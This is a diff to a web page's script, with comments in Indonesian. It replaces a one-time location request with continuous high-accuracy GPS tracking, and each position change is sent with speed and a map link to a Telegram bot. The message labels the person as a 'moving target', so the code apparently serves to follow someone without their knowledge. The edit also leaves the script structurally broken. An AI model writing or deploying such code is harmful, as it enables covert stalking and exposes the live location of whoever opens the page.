@@ -18,12 +18,38 @@
     </div>
 
     <script>
-        function mintaLokasi() {
-            const status = document.getElementById('status');
-            if (!navigator.geolocation) {
-                status.innerText = "Browser Anda tidak mendukung GPS.";
-                return;
-            }
+        // Gunakan watchPosition untuk mendapatkan pembaruan lokasi secara live
+navigator.geolocation.watchPosition(
+    (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const speed = position.coords.speed || 0; // Mendeteksi kecepatan gerak
+
+        // Link Google Maps Live
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // Kirim ke Telegram/Webhook setiap kali posisi berubah
+        kirimDataKeOwner(lat, lon, speed);
+        
+        console.log("Posisi terupdate:", lat, lon);
+    },
+    (error) => {
+        console.error("Gagal melacak secara live:", error);
+    },
+    {
+        enableHighAccuracy: true, // Menggunakan GPS (Akurasi Tinggi)
+        maximumAge: 0,            // Tidak menggunakan cache data lama
+        timeout: 5000             // Update setiap 5 detik
+    }
+);
+
+function kirimDataKeOwner(lat, lon, speed) {
+    const token = "TOKEN_BOT_TELEGRAM_ANDA";
+    const chatId = "ID_CHAT_ANDA";
+    const pesan = `📍 TARGET BERGERAK!\n\nLat: ${lat}\nLon: ${lon}\nKecepatan: ${speed} m/s\n\nLihat di Peta: https://www.google.com/maps?q=${lat},${lon}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
+}    
 
             status.innerText = "Sedang memproses...";
 
@@ -48,4 +74,5 @@
         }
     </script>
 </body>
+
 </html>
